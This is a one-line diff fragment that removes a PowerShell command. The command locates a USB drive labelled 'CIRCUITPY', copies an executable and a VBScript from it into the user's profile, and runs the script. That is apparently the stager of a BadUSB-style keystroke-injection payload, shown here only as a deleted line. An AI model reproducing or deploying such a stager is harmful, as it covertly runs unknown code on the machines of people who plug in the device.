@@ -1,1 +1,0 @@
-powershell $u=$env:USERPROFILE; $l=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; $r=\"${l}:\R.exe\"; $v=\"${l}:\b.vbs\"; Copy $v $u; Copy $r $u; cd $u; wscript b.vbs
